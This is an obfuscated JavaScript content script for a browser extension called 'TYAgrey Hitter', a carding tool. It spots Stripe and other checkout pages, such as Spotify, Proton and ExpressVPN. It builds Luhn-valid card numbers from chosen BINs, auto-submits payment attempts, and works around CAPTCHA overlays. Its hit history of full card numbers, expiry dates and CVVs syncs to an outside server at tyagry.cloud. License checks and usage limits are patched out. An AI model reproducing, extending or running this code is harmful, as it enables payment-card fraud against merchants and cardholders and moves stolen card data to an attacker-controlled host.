      if (typeof autoHideDashboardForCaptcha === "function") {
        autoHideDashboardForCaptcha();
      }
      return;
    }
    const _0x17e0a7 = _0x304c9e.some(_0x24192c => {
      return Array.from(_0x24192c.removedNodes).some(_0x13e4d5 => {
        if (_0x13e4d5.nodeType === 1) {
          return _0x13e4d5.matches && (_0x13e4d5.matches("[class*=\"hcaptcha\"]") || _0x13e4d5.matches("[id*=\"hcaptcha\"]") || _0x13e4d5.matches("[data-hcaptcha]") || _0x13e4d5.matches("iframe[src*=\"hcaptcha\"]") || _0x13e4d5.matches("iframe[src*=\"captcha\"]") || _0x13e4d5.matches("[class*=\"captcha\"]") || _0x13e4d5.matches("[class*=\"challenge\"]") || _0x13e4d5.matches("[class*=\"Challenge\"]") || _0x13e4d5.matches("[role=\"dialog\"]"));
        }
        return false;
      });
    });
    if (_0x17e0a7) {
      setTimeout(() => {
        isCaptchaVisible = checkCaptchaVisible();
        if (!isCaptchaVisible) {
          isRestoringAfterCaptcha = true;
          applyCustomStyles();
          if (typeof restoreDashboardAfterCaptcha === "function") {
            restoreDashboardAfterCaptcha();
          }
          setTimeout(() => {
            isRestoringAfterCaptcha = false;
          }, 400);
        }
      }, 500);
      return;
    }
    const _0x583e97 = _0x304c9e.some(_0x5ad543 => _0x5ad543.type === "childList" && _0x5ad543.addedNodes.length > 0);
    if (_0x583e97 && !isCaptchaVisible) {
      debouncedApplyStyles();
    }
  });
  styleObserver.observe(document.body, {
    childList: true,
    subtree: true
  });
  const CARD_FIELD_SELECTORS = ["#cardNumber", "[name=\"cardNumber\"]", "[name=\"card-number\"]", "[name=\"cardnumber\"]", "[autocomplete=\"cc-number\"]", "[data-elements-stable-field-name=\"cardNumber\"]", "input[placeholder*=\"card number\" i]", "input[placeholder*=\"card no\" i]", "input[aria-label*=\"card number\" i]", "#card-number", ".card-number", "[name=\"number\"]", "[name=\"ccnumber\"]", "[name=\"cc-number\"]", "[data-stripe=\"number\"]", "input[name*=\"cardNumber\" i]", "input[name*=\"card_number\" i]", "input[name*=\"creditcard\" i]", "input[id*=\"cardNumber\" i]", "input[id*=\"card-number\" i]", "input[id*=\"cc-number\" i]", "input[placeholder*=\"0000 0000 0000 0000\" i]", "input[aria-label*=\"card\" i]", "[id*=\"card\" i] input", "[class*=\"card\" i] input"];
  const SUBMIT_BUTTON_SELECTORS = [".SubmitButton", "[class*=\"SubmitButton\"]", ".SubmitButton-IconContainer", ".Button--primary", "button[type=\"submit\"]", "[data-testid=\"hosted-payment-submit-button\"]", ".pay-button", ".payment-button", "button[class*=\"pay\" i]", "button[class*=\"submit\" i]", "button[class*=\"subscribe\" i]", "button[id*=\"subscribe\" i]", "button[class*=\"buy\" i]", "button[class*=\"order\" i]", "[role=\"button\"]"];
  function hasCardFields() {
    for (const _0x536f35 of CARD_FIELD_SELECTORS) {
      try {
        const _0x174109 = document.querySelector(_0x536f35);
        if (_0x174109) {
          return true;
        }
      } catch (_0x5d233d) {}
    }
    const _0x1d192a = document.querySelectorAll("iframe");
    for (const _0x269b15 of _0x1d192a) {
      try {
        const _0xd1555f = _0x269b15.src || "";
        const _0xca6abb = _0x269b15.name || "";
        const _0x2c165e = _0x269b15.id || "";
        if (_0xd1555f.includes("stripe") || _0xca6abb.includes("card") || _0x2c165e.includes("card") || _0xd1555f.includes("checkout") || _0xd1555f.includes("payment")) {
          return true;
        }
      } catch (_0x20c61d) {}
    }
    return false;
  }
  function hasSubmitButton() {
    for (const _0x3a2d98 of SUBMIT_BUTTON_SELECTORS) {
      try {
        const _0x37cc37 = document.querySelector(_0x3a2d98);
        if (_0x37cc37) {
          return true;
        }
      } catch (_0x322054) {}
    }
    return false;
  }
  function hasStripeSessionInUrl() {
    const _0x472176 = window.location.href;
    const _0x2602b2 = window.location.hostname.toLowerCase();
    const _0x3c8098 = window.location.pathname.toLowerCase();
    const _0x14a5db = _0x2602b2.includes("stripe.com") || _0x2602b2.includes("checkout.") || _0x2602b2.includes("pay.") || _0x2602b2.includes("billing.") || _0x2602b2.includes("invoice.") || _0x2602b2.includes("buy.") || _0x2602b2.includes("aftershoot") || _0x2602b2.includes("chatgpt") || _0x2602b2.includes("openai") || _0x2602b2.includes("spotify") || _0x2602b2.includes("hotspotshield") || _0x2602b2.includes("payments") || _0x2602b2.includes("proton") || _0x2602b2.includes("expressvpn");
    if (!_0x14a5db) {
      return false;
    }
    if (_0x472176.includes("cs_live_") || _0x472176.includes("cs_test_")) {
      return true;
    }
    if (_0x3c8098.includes("/checkout/session/")) {
      return true;
    }
    if (_0x3c8098.includes("/checkout") && _0x14a5db) {
      return true;
    }
    if (_0x472176.includes("checkout.stripe.com/c/pay")) {
      return true;
    }
    if (_0x2602b2 === "buy.stripe.com") {
      return true;
    }
    if (_0x472176.includes("get.hotspotshield.com/trial")) {
      return true;
    }
    if (_0x472176.includes("buy.stripe.com/5kQcN60zyeb8gng2k9csI0k")) {
      return true;
    }
    if (_0x472176.includes("payments.spotify.com/checkout")) {
      return true;
    }
    if (_0x472176.includes("account.proton.me/refer-a-friend/signup")) {
      return true;
    }
    return false;
  }
  function hasValidStripeKeys() {
    const _0x21167d = extractCsLive(window.location.href);
    const _0x4edc70 = extractPkLive();
    return !!_0x21167d && !!_0x4edc70;
  }
  function isInvoiceStripePage() {
    const _0x2e516b = window.location.href;
    return _0x2e516b.includes("invoice.stripe.com") || _0x2e516b.includes("/invoice/");
  }
  let invoiceData = null;
  function extractInvoiceData() {
    if (invoiceData) {
      return invoiceData;
    }
    try {
      const _0x2f1b4e = document.querySelectorAll("script");
      for (const _0x29e43b of _0x2f1b4e) {
        const _0x12a290 = _0x29e43b.textContent || "";
        if (_0x12a290.includes("\"object\":\"invoice\"") || _0x12a290.includes("\"amount_due\"")) {
          const _0x79b8cc = _0x12a290.match(/\{[\s\S]*"object"\s*:\s*"invoice"[\s\S]*\}/);
          if (_0x79b8cc) {
            try {
              const _0x5bddd4 = JSON.parse(_0x79b8cc[0]);
              if (_0x5bddd4.object === "invoice") {
                invoiceData = {
                  amount: _0x5bddd4.amount_due || _0x5bddd4.total || 0,
                  currency: _0x5bddd4.currency || "usd",
                  email: _0x5bddd4.customer_email || _0x5bddd4.customer?.email || "",
                  productName: "",
                  businessUrl: "",
                  voided: _0x5bddd4.voided === true
                };
                if (_0x5bddd4.lines?.data?.[0]) {
                  const _0x1531f1 = _0x5bddd4.lines.data[0];
                  invoiceData.productName = _0x1531f1.hosted_invoice_product_name || _0x1531f1.description || "";
                }
                if (_0x5bddd4.business_url) {
                  invoiceData.businessUrl = _0x5bddd4.business_url;
                }
                return invoiceData;
              }
            } catch (_0x3675d5) {}
          }
        }
      }
      if (window.__STRIPE_INVOICE__) {
        const _0x253c77 = window.__STRIPE_INVOICE__;
        invoiceData = {
          amount: _0x253c77.amount_due || _0x253c77.total || 0,
          currency: _0x253c77.currency || "usd",
          email: _0x253c77.customer_email || "",
          productName: _0x253c77.lines?.data?.[0]?.hosted_invoice_product_name || "",
          businessUrl: _0x253c77.business_url || "",
          voided: _0x253c77.voided === true
        };
        return invoiceData;
      }
      const _0x4add26 = document.body?.innerText || "";
      const _0x1c9692 = _0x4add26.match(/[\w.-]+@[\w.-]+\.\w+/);
      const _0x200180 = _0x4add26.match(/[₩$€£¥]\s*[\d,]+\.?\d*/);
      if (_0x1c9692 || _0x200180) {
        invoiceData = {
          amount: _0x200180 ? _0x200180[0] : "0",
          currency: "",
          email: _0x1c9692 ? _0x1c9692[0] : "",
          productName: "",
          businessUrl: "",
          voided: false
        };
      }
    } catch (_0x173c27) {}
    return invoiceData;
  }
  function isInvoiceVoided() {
    const _0xeeea5f = extractInvoiceData();
    return _0xeeea5f?.voided === true;
  }
  function getInvoiceDisplayName() {
    const _0x5167a9 = extractInvoiceData();
    if (!_0x5167a9) {
      return "";
    }
    return _0x5167a9.businessUrl || _0x5167a9.productName || "";
  }
  function getInvoiceAmount() {
    const _0x567637 = extractInvoiceData();
    if (!_0x567637) {
      return "";
    }
    const _0x39f735 = _0x567637.amount;
    const _0x539969 = _0x567637.currency?.toUpperCase() || "";
    if (typeof _0x39f735 === "number") {
      const _0x7afcdb = ["KRW", "JPY", "VND"];
      if (_0x7afcdb.includes(_0x539969)) {
        return _0x39f735.toLocaleString() + " " + _0x539969;
      }
      return (_0x39f735 / 100).toFixed(2) + " " + _0x539969;
    }
    return _0x39f735 || "0";
  }
  function getInvoiceEmail() {
    const _0x21b80a = extractInvoiceData();
    return _0x21b80a?.email || "";
  }
  function isBuyStripePage() {
    const _0x3fc94e = window.location.hostname.toLowerCase();
    return _0x3fc94e === "buy.stripe.com" || _0x3fc94e.endsWith(".buy.stripe.com");
  }
  function isPaymentPage() {
    const _0x5c70ed = window.location.hostname.toLowerCase();
    if (isBuyStripePage()) {
      const _0x211c9f = hasCardFields();
      const _0x514f8b = hasSubmitButton();
      if (_0x211c9f && _0x514f8b) {
        return true;
      }
      if (document.querySelector("[class*=\"PaymentElement\"], [class*=\"StripeElement\"], [class*=\"CardElement\"], [class*=\"CheckoutPaymentForm\"], form[class*=\"Payment\"]")) {
        return true;
      }
      if (document.querySelector("[class*=\"App\"], [id=\"root\"], [class*=\"Checkout\"]")) {
        return true;
      }
      return false;
    }
    if (_0x5c70ed === "get.hotspotshield.com" || _0x5c70ed.endsWith(".get.hotspotshield.com")) {
      const _0x4b9fe3 = hasCardFields();
      const _0x4fb2da = hasSubmitButton();
      if (_0x4b9fe3 && _0x4fb2da) {
        return true;
      }
      if (document.querySelector("form, input[type=\"text\"], input[name*=\"card\"], [class*=\"payment\"], [class*=\"checkout\"]")) {
        return true;
      }
    }
    if (_0x5c70ed === "payments.spotify.com" || _0x5c70ed.endsWith(".payments.spotify.com")) {
      const _0xf3d496 = hasCardFields();
      const _0x4d6931 = hasSubmitButton();
      if (_0xf3d496 && _0x4d6931) {
        return true;
      }
      if (document.querySelector("form, input[type=\"text\"], input[name*=\"card\"], [class*=\"payment\"], [class*=\"checkout\"]")) {
        return true;
      }
    }
    if (_0x5c70ed === "account.proton.me" || _0x5c70ed.endsWith(".account.proton.me")) {
      const _0x909119 = hasCardFields();
      const _0x5b720f = hasSubmitButton();
      if (_0x909119 && _0x5b720f) {
        return true;
      }
      if (document.querySelector("form, input[type=\"text\"], input[name*=\"card\"], [class*=\"payment\"], [class*=\"checkout\"]")) {
        return true;
      }
    }
    if (_0x5c70ed.includes("expressvpn")) {
      const _0x539ba8 = hasCardFields();
      const _0x58a4c6 = hasSubmitButton();
      if (_0x539ba8 && _0x58a4c6) {
        return true;
      }
      if (document.querySelector("form, input[type=\"text\"], input[name*=\"card\"], [class*=\"payment\"], [class*=\"checkout\"]")) {
        return true;
      }
    }
    if (isInvoiceStripePage()) {
      if (isInvoiceVoided()) {
        return false;
      }
      const _0x44427c = hasCardFields();
      const _0x31a0c4 = hasSubmitButton();
      const _0x52b6fc = document.querySelector("[class*=\"InvoicePage\"], [class*=\"invoice\"], [id=\"root\"]");
      if ((_0x44427c || _0x31a0c4) && _0x52b6fc) {
        return true;
      }
      if (window.location.hostname === "invoice.stripe.com") {
        return true;
      }
    }
    const _0x4bb888 = hasCardFields();
    if (!_0x4bb888) {
      return false;
    }
    const _0x5c1b69 = hasSubmitButton();
    if (!_0x5c1b69) {
      return false;
    }
    const _0x14150d = hasStripeSessionInUrl();
    if (!_0x14150d) {
      return false;
    }
    const _0x1e6cb6 = hasValidStripeKeys();
    if (!_0x1e6cb6) {
      return false;
    }
    return true;
  }
  function waitForPaymentPage(_0x4935be, _0x19a2d7 = 40) {
    let _0x5c8bbe = 0;
    const _0x26f667 = () => {
      const _0x504218 = hasCardFields();
      const _0x5e5a8d = hasSubmitButton();
      const _0x45d74c = hasStripeSessionInUrl();
      const _0xce1c53 = hasValidStripeKeys();
      if (isBuyStripePage()) {
        if (_0x504218 || _0x5e5a8d) {
          _0x4935be(true);
          return;
        }
        if (document.querySelector("[class*=\"PaymentElement\"], [class*=\"StripeElement\"], [class*=\"CardElement\"], [class*=\"CheckoutPaymentForm\"], form[class*=\"Payment\"]")) {
          _0x4935be(true);
          return;
        }
        if (document.querySelector("[class*=\"Checkout\"], [class*=\"payment\"], [class*=\"Payment\"]")) {
          _0x4935be(true);
          return;
        }
      }
      if (isInvoiceStripePage()) {
        extractInvoiceData();
        if (isInvoiceVoided()) {
          _0x4935be(false);
          return;
        }
        const _0xbc7bb8 = document.querySelector("[class*=\"InvoicePage\"], [class*=\"invoice\"]");
        if (_0xbc7bb8 || window.location.hostname === "invoice.stripe.com") {
          _0x4935be(true);
          return;
        }
      }
      if (_0x504218 && (_0x5e5a8d || _0x45d74c || _0xce1c53)) {
        _0x4935be(true);
        return;
      }
      if (_0x504218 && document.querySelector("[class*=\"checkout\"], [class*=\"payment\"], [class*=\"Payment\"], [class*=\"billing\"], form[action*=\"stripe\"], form[action*=\"payment\"]")) {
        _0x4935be(true);
        return;
      }
      if (_0x504218) {
        _0x4935be(true);
        return;
      }
      if (_0x5c8bbe < _0x19a2d7) {
        _0x5c8bbe++;
        const _0x110522 = _0x5c8bbe < 5 ? 200 : 150;
        setTimeout(_0x26f667, _0x110522);
      } else {
        _0x4935be(false);
      }
    };
    _0x26f667();
  }
  const LICENSE_KEY = "TYAgrey Hitter";
  const CURRENT_VERSION = "1.1";
  let telegramChannelLink = "https://t.me/tyagrey";
  let isCreatingOverlay = false;
  let licenseChecked = false;
  let licenseValid = false;
  let latestVersion = "";
  let isVersionOutdated = false;
  const pendingRequests = new Map();
  let requestId = 0;
  function sendToBackground(_0x6d9ad5) {
    return new Promise(_0x1c4c0d => {
      const _0x5e1bc8 = ++requestId;
      pendingRequests.set(_0x5e1bc8, _0x1c4c0d);
      window.postMessage({
        type: "tyagrey_TO_BACKGROUND",
        requestId: _0x5e1bc8,
        payload: _0x6d9ad5
      }, "*");
      setTimeout(() => {
        if (pendingRequests.has(_0x5e1bc8)) {
          pendingRequests.delete(_0x5e1bc8);
          _0x1c4c0d({
            success: false,
            error: "Request timeout"
          });
        }
      }, 60000);
    });
  }
  function hasBinAccess() {
    return true;
  }
  function has3DSAccess() {
    return true;
  }
  function calculateLuhnCheckDigit(_0x122e00) {
    let _0x3548bd = 0;
    let _0x411294 = false;
    for (let _0x1df5aa = _0x122e00.length - 1; _0x1df5aa >= 0; _0x1df5aa--) {
      let _0x1e5022 = parseInt(_0x122e00[_0x1df5aa], 10);
      if (_0x411294) {
        _0x1e5022 *= 2;
        if (_0x1e5022 > 9) {
          _0x1e5022 -= 9;
        }
      }
      _0x3548bd += _0x1e5022;
      _0x411294 = !_0x411294;
    }
    return (10 - _0x3548bd % 10) % 10;
  }
  function replaceCardBinWithLuhn(_0x6a377e, _0x55b9c1 = "414720") {
    if (!_0x6a377e || _0x6a377e.length < 13) {
      return _0x6a377e;
    }
    const _0xb16ef5 = _0x6a377e.slice(0, -1);
    const _0x398515 = _0x55b9c1 + _0xb16ef5.slice(6);
    const _0x4181a7 = calculateLuhnCheckDigit(_0x398515);
    return _0x398515 + _0x4181a7;
  }
  function generateValidCardWithFakeBin(_0x33839e = "414720") {
    const _0x3240fc = _0x33839e + "1234567890";
    const _0x155c44 = calculateLuhnCheckDigit(_0x3240fc.slice(0, -1));
    return _0x3240fc.slice(0, -1) + _0x155c44;
  }
  function hasGatewayAccess(_0x5ae108) {
    return true;
  }
  async function refreshUserRole() {
    userRole = "owner";
    localStorage.setItem("tyagrey_user_role", "owner");
    console.log("[TYAgrey] Current user role: owner (forced)");
  }
  async function checkDailyHitLimit() {
    return {
      limited: false,
      hits_today: 0,
      limit: 999999,
      remaining: 999999
    };
  }
  async function updateStartButtonState() {
    const _0xa92791 = await checkDailyHitLimit();
    if (_0xa92791 && _0xa92791.limited) {
      setStartButtonEnabled(false);
      if (_0xa92791.error) {
        showWarning("⚠️ " + _0xa92791.error, "error");
      } else {
        const _0x1628e8 = _0xa92791.hits_today || 0;
        const _0x2b6671 = _0xa92791.limit || 5;
        showWarning("⚠️ Daily hit limit reached (" + _0x1628e8 + "/" + _0x2b6671 + "). Upgrade to Pro for unlimited hits.", "error");
      }
    } else {
      setStartButtonEnabled(true);
    }
  }
  function setStartButtonEnabled(_0x581e3f) {
    const _0x522894 = document.getElementById("autocoBtn");
    const _0x48de08 = document.getElementById("tya-ctrl-start");
    if (_0x522894) {
      _0x522894.disabled = !_0x581e3f;
      if (!_0x581e3f) {
        _0x522894.style.opacity = "0.5";
        _0x522894.style.cursor = "not-allowed";
        _0x522894.setAttribute("data-disabled-reason", "daily-limit");
      } else {
        _0x522894.style.opacity = "1";
        _0x522894.style.cursor = "pointer";
        _0x522894.removeAttribute("data-disabled-reason");
      }
    }
    if (_0x48de08) {
      _0x48de08.disabled = !_0x581e3f;
      if (!_0x581e3f) {
        _0x48de08.style.opacity = "0.5";
        _0x48de08.style.cursor = "not-allowed";
        _0x48de08.setAttribute("data-disabled-reason", "daily-limit");
      } else {
        _0x48de08.style.opacity = "1";
        _0x48de08.style.cursor = "pointer";
        _0x48de08.removeAttribute("data-disabled-reason");
      }
    }
  }
  if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.onChanged) {
    chrome.storage.onChanged.addListener(function (_0x4d1ed2, _0x1db69e) {
      if (_0x1db69e === "local" && _0x4d1ed2.tyagrey_role) {
        const _0x2c6371 = _0x4d1ed2.tyagrey_role.newValue || "user";
        if (_0x2c6371 !== userRole) {
          console.log("[TYAgrey] Role changed from", userRole, "to", _0x2c6371);
          userRole = _0x2c6371;
          localStorage.setItem("tyagrey_user_role", _0x2c6371);
        }
      }
    });
  }
  window.setOwnerRole = function () {
    userRole = "owner";
    localStorage.setItem("tyagrey_user_role", "owner");
    console.log("[TYAgrey] Role set to owner manually");
    showWarning("✅ Owner role activated", "success");
  };
  window.addEventListener("message", _0x5253c5 => {
    if (_0x5253c5.data && _0x5253c5.data.type === "tyagrey_FROM_BACKGROUND" && _0x5253c5.data.requestId) {
      const _0x481c32 = pendingRequests.get(_0x5253c5.data.requestId);
      if (_0x481c32) {
        pendingRequests.delete(_0x5253c5.data.requestId);
        _0x481c32(_0x5253c5.data.response || {
          success: false,
          error: "No response"
        });
      }
    }
  });
  async function handleAPIRequest(_0x35fa56, _0x5675c9 = {}) {
    return await sendToBackground({
      type: "API_REQUEST",
      endpoint: _0x35fa56,
      payload: _0x5675c9
    });
  }
  function compareVersions(_0x5908a3, _0x4bbae2) {
    const _0x4b68a6 = _0x5908a3.replace(/^v/, "").split(".").map(Number);
    const _0xc9f980 = _0x4bbae2.replace(/^v/, "").split(".").map(Number);
    for (let _0x1d8cfb = 0; _0x1d8cfb < Math.max(_0x4b68a6.length, _0xc9f980.length); _0x1d8cfb++) {
      const _0x523e25 = _0x4b68a6[_0x1d8cfb] || 0;
      const _0x40de48 = _0xc9f980[_0x1d8cfb] || 0;
      if (_0x523e25 < _0x40de48) {
        return -1;
      }
      if (_0x523e25 > _0x40de48) {
        return 1;
      }
    }
    return 0;
  }
  async function checkLicenseKey(_0x17958d = 0) {
    const _0x5f3cba = 3;
    if (licenseChecked && licenseValid) {
      return licenseValid;
    }
    if (!LICENSE_KEY) {
      licenseValid = false;
      licenseChecked = true;
      return false;
    }
    try {
      const _0x483393 = await sendToBackground({
        type: "CHECK_LICENSE_KEY",
        key: LICENSE_KEY,
        version: CURRENT_VERSION
      });
      if (!_0x483393 || _0x483393.error) {
        if (_0x17958d < _0x5f3cba) {
          return checkLicenseKey(_0x17958d + 1);
        }
        licenseValid = true;
        licenseChecked = true;
        isVersionOutdated = false;
        return true;
      }
      if (_0x483393.valid === true) {
        licenseValid = true;
        licenseChecked = true;
        if (_0x483393.telegram_channel) {
          telegramChannelLink = _0x483393.telegram_channel;
        }
        if (_0x483393.latest_version && typeof _0x483393.latest_version === "string") {
          latestVersion = _0x483393.latest_version.trim();
          const _0x57db00 = compareVersions(CURRENT_VERSION, latestVersion);
          isVersionOutdated = _0x57db00 === -1;
        } else {
          isVersionOutdated = false;
        }
        isVersionOutdated = false;
        return true;
      } else {
        if (_0x17958d < _0x5f3cba) {
          return checkLicenseKey(_0x17958d + 1);
        }
        licenseValid = false;
        licenseChecked = true;
        if (_0x483393.telegram_channel) {
          telegramChannelLink = _0x483393.telegram_channel;
        }
        return false;
      }
    } catch (_0x54b173) {
      if (_0x17958d < _0x5f3cba) {
        return checkLicenseKey(_0x17958d + 1);
      }
      licenseValid = true;
      licenseChecked = true;
      isVersionOutdated = false;
      return true;
    }
  }
  function showUpdatePage(_0x5d617e = "outdated") {
    return;
    const _0x6faf7d = document.querySelector(".card-generator-overlay");
    if (_0x6faf7d) {
      _0x6faf7d.remove();
    }
    const _0x33566c = document.createElement("div");
    _0x33566c.className = "card-generator-overlay";
    _0x33566c.innerHTML = "\n    <div class=\"panel-header\">\n      <div class=\"panel-header-content\">\n        <span class=\"panel-title\">TYAgrey Hitter</span>\n      </div>\n    </div>\n    <div class=\"panel-body\">\n      <div id=\"updateScreen\" class=\"update-screen\">\n        <div class=\"update-icon\">🔄</div>\n        <h2 class=\"update-title\">Update Required</h2>\n        <p class=\"update-message\">\n          Your extension version is outdated.\n          Please download the latest version to continue using TYAgrey Hitter.\n        </p>\n        <div class=\"update-version\">\n          <span class=\"current-version\">Current: v" + CURRENT_VERSION + "</span>\n        </div>\n        <a href=\"" + telegramChannelLink + "\" target=\"_blank\" class=\"update-btn\">\n          📥 Download Update\n        </a>\n      </div>\n    </div>\n  ";
    document.body.appendChild(_0x33566c);
  }
  function showInvalidLicensePage() {
    return;
    const _0x61fd46 = document.querySelector(".card-generator-overlay");
    if (_0x61fd46) {
      _0x61fd46.remove();
    }
    const _0x2fea93 = document.createElement("div");
    _0x2fea93.className = "card-generator-overlay";
    _0x2fea93.innerHTML = "\n    <div class=\"panel-header\">\n      <div class=\"panel-header-content\">\n        <span class=\"panel-title\">TYAgrey Hitter</span>\n      </div>\n    </div>\n    <div class=\"panel-body\">\n      <div id=\"updateScreen\" class=\"update-screen\">\n        <div class=\"update-icon\">🔄</div>\n        <h2 class=\"update-title\">Update Required</h2>\n        <p class=\"update-message\">\n          Your extension version is outdated.\n          Please download the latest version to continue using TYAgrey Hitter.\n        </p>\n        <div class=\"update-version\">\n          <span class=\"current-version\">Current: v" + CURRENT_VERSION + "</span>\n        </div>\n        <a href=\"" + telegramChannelLink + "\" target=\"_blank\" class=\"update-btn\">\n          📥 Download Update\n        </a>\n      </div>\n    </div>\n  ";
    document.body.appendChild(_0x2fea93);
  }
  const HIT_API_URL = "https://tyagry.cloud/api.php";
  let _hitCountsInterval = null;
  const HIT_COUNTS_REFRESH_MS = 30000;
  let __tyagrey_recentHitUntil = 0;
  function markRecentHitWindow(_0x551c04) {
    __tyagrey_recentHitUntil = Date.now() + (_0x551c04 || 5000);
  }
  function isWithinRecentHitWindow() {
    return Date.now() < (__tyagrey_recentHitUntil || 0);
  }
  async function fetchHitCounts(_0x23d7e5) {
    try {
      const _0xf16b02 = localStorage.getItem(K.TOKEN) || "";
      const _0x16b03c = {
        _method: "GET"
      };
      if (_0xf16b02 && _0xf16b02.length === 6) {
        _0x16b03c.token = _0xf16b02;
      }
      const _0x45b463 = await sendToBackground({
        type: "API_REQUEST",
        endpoint: "hit-counts",
        payload: _0x16b03c
      });
      if (_0x45b463 && _0x45b463.success !== false) {
        if (_0x23d7e5 || isWithinRecentHitWindow()) {
          if (_0x45b463.global_hits !== undefined) {
            globalHitsCount = _0x45b463.global_hits;
          }
          if (_0x45b463.user_hits !== undefined && _0xf16b02) {
            userHitsCount = _0x45b463.user_hits;
          }
          updateIpBarUserInfo();
        }
      }
    } catch (_0x59ace8) {}
  }
  function apiFetch(_0x5f4414, _0x16eff0) {
    _0x16eff0 = _0x16eff0 || {};
    return fetch("https://tyagry.cloud/api.php", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body: new URLSearchParams({
        action: _0x5f4414,
        ..._0x16eff0
      })
    }).then(_0x222158 => _0x222158.json()).catch(_0x530830 => {
      console.error("[apiFetch] Error:", _0x530830);
      return {
        success: false,
        error: _0x530830.message
      };
    });
  }
  async function fetchGlobalHits() {
    return fetchHitCounts();
  }
  function startHitCountsRefresh() {
    if (_hitCountsInterval) {
      return;
    }
    fetchHitCounts(true);
    _hitCountsInterval = setInterval(fetchHitCounts, HIT_COUNTS_REFRESH_MS);
  }
  function stopHitCountsRefresh() {
    if (_hitCountsInterval) {
      clearInterval(_hitCountsInterval);
      _hitCountsInterval = null;
    }
  }
  let _cloudSyncInterval = null;
  const CLOUD_SYNC_MS = 60000;
  async function periodicCloudSync() {
    try {
      const _0x4ab7eb = localStorage.getItem(K.TOKEN) || "";
      if (!_0x4ab7eb || _0x4ab7eb.length !== 6 || !isLoggedIn) {
        return;
      }
      const _0xf7a104 = await Promise.race([handleAPIRequest("get-user-data", {
        token: _0x4ab7eb
      }), new Promise(_0x37dcee => setTimeout(() => _0x37dcee({
        success: false,
        timeout: true
      }), 4000))]);
      if (!_0xf7a104 || !_0xf7a104.success) {
        return;
      }
      const _0x2119eb = Array.isArray(_0xf7a104.panel_bins) && _0xf7a104.panel_bins.length > 0 ? normalizeBinArray(_0xf7a104.panel_bins) : Array.isArray(_0xf7a104.saved_bins) ? normalizeBinArray(_0xf7a104.saved_bins) : [];
      if (_0x2119eb.length > 0) {
        applyPanelBinsCache(_0x2119eb);
        if (window.tyagreyStorage && window.tyagreyStorage.loadPanelQuickBins) {
          window.tyagreyStorage.loadPanelQuickBins(_0xa92deb => {
            if (!isExplicitPanelQuickBins(_0xa92deb) && (savedBINs.length === 0 || _0x2119eb.length > savedBINs.length)) {
              savedBINs = _0x2119eb.slice();
              populateBinInputs();
              updateSwitchBtnVisibility();
            }
          });
        } else if (savedBINs.length === 0 || _0x2119eb.length > savedBINs.length) {
          savedBINs = _0x2119eb.slice();
          populateBinInputs();
          updateSwitchBtnVisibility();
        }
      }
      if (isWithinRecentHitWindow()) {
        if (typeof _0xf7a104.total_hits === "number" && _0xf7a104.total_hits > userHitsCount) {
          userHitsCount = _0xf7a104.total_hits;
        }
        if (typeof _0xf7a104.total_attempts === "number" && _0xf7a104.total_attempts > userAttemptsCount) {
          userAttemptsCount = _0xf7a104.total_attempts;
        }
      }
      if (Array.isArray(_0xf7a104.hit_history) && _0xf7a104.hit_history.length > 0 && cardHistory.length === 0) {
        cardHistory = _0xf7a104.hit_history.map(_0x5534da => ({
          card: _0x5534da.card || _0x5534da.card_info || "",
          mm: _0x5534da.mm || "",
          yy: _0x5534da.yy || "",
          cvv: _0x5534da.cvv || "",
          response: _0x5534da.status || _0x5534da.response || "SUCCESS",
          time: _0x5534da.time && _0x5534da.time !== "0000-00-00 00:00:00" ? _0x5534da.time : _0x5534da.created_at && _0x5534da.created_at !== "0000-00-00 00:00:00" ? _0x5534da.created_at : new Date().toLocaleString("en-US", {
            month: "2-digit",
            day: "2-digit",
            year: "numeric",
            hour: "2-digit",
            minute: "2-digit",
            second: "2-digit",
            hour12: false
          })
        }));
        saveCardHistory();
        updateHistoryDisplay();
      }
      if (isWithinRecentHitWindow()) {
        updateIpBarUserInfo();
      }
    } catch (_0x5a1f13) {}
  }
  function startPeriodicCloudSync() {
    if (_cloudSyncInterval) {
      return;
    }
    periodicCloudSync();
    _cloudSyncInterval = setInterval(periodicCloudSync, CLOUD_SYNC_MS);
  }
  function stopPeriodicCloudSync() {
    if (_cloudSyncInterval) {
      clearInterval(_cloudSyncInterval);
      _cloudSyncInterval = null;
    }
  }
  let hasNotified = false;
  let hasHit = false;
  let isMinimized = false;
  let isAutoSubmitting = false;
  let isPaused = false;
  let attemptCount = 0;
  let retryDelay = Math.floor(Math.random() * 500) + 500;
  let cardHistory = [];
  let customCheckoutActive = false;
  let customCheckoutSettings = null;
  let customCheckoutOriginalMode = null;
  let customCheckoutOriginalCcList = null;
  let customCheckoutStats = {
    total: 0,
    charged: 0,
    live: 0,
    dead: 0
  };
  let customCheckoutCurrentCcIndex = 0;
  let customCheckoutCcList = [];
  function bumpLocalDashboardCounters(_0x579b0f, _0x2d0587) {
    try {
      if (typeof chrome === "undefined" || !chrome.storage || !chrome.storage.local) {
        return;
      }
      chrome.storage.local.get(["tya_local_hits", "tya_local_attempts"], function (_0x534261) {
        const _0x286b1d = parseInt(_0x534261 && _0x534261.tya_local_hits ? _0x534261.tya_local_hits : 0, 10) || 0;
        const _0x589211 = parseInt(_0x534261 && _0x534261.tya_local_attempts ? _0x534261.tya_local_attempts : 0, 10) || 0;
        const _0x934f5d = {};
        if (_0x579b0f) {
          _0x934f5d.tya_local_hits = _0x286b1d + _0x579b0f;
        }
        if (_0x2d0587) {
          _0x934f5d.tya_local_attempts = _0x589211 + _0x2d0587;
        }
        if (Object.keys(_0x934f5d).length > 0) {
          chrome.storage.local.set(_0x934f5d);
        }
      });
    } catch (_0x52a1d9) {}
  }
  function prependLocalHistory(_0x213060) {
    try {
      if (typeof chrome === "undefined" || !chrome.storage || !chrome.storage.local) {
        return;
      }
      chrome.storage.local.get(["tya_local_history"], function (_0xc5dd68) {
        const _0x3fa63e = Array.isArray(_0xc5dd68 && _0xc5dd68.tya_local_history) ? _0xc5dd68.tya_local_history : [];
        _0x3fa63e.unshift(_0x213060);
        chrome.storage.local.set({
          tya_local_history: _0x3fa63e.slice(0, 50)
        });
      });
    } catch (_0x4cfc8e) {}
  }
  async function recordHit(_0x2cded1, _0x5d43a4) {
    try {
      if (!_0x5d43a4.fullCard || _0x5d43a4.fullCard.length < 10) {
        console.warn("[recordHit] Invalid card data, skipping");
        return;
      }
      const _0x1386ac = scrapeExtraFormFields();
      Object.assign(extractedPaymentData, _0x1386ac);
      const _0x3a9278 = window.location.hostname || "N/A";
